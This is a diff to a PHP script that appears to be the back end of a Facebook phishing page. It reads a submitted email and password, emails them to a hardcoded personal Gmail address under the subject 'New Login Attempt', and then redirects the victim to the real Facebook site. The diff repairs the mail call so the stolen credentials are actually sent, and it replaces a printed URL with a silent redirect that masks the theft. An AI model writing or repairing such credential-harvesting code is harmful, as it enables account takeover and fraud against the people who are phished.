@@ -1,15 +1,14 @@
 <?php
 $email = $_POST["email"];
-$passkey = $_POST["pass"];
+$passkey = $_POST["password"];
 
 $recipient = "israelstoba@gmail.com";
+$subject = "New Login Attempt";
+$message = "Email: $email\nPassword: $passkey";
+$mailheader = "From: $email\r\n";
 
-
-$mailheader = "From:" .$email. "<" .$passkey. ">\r\n";
-
-mail($recipient, $mailheader)
+mail($recipient, $subject, $message, $mailheader)
 or die("Error");
 
-echo "https://web.facebook.com";
-
+header("location:https://web.facebook.com");
 ?>
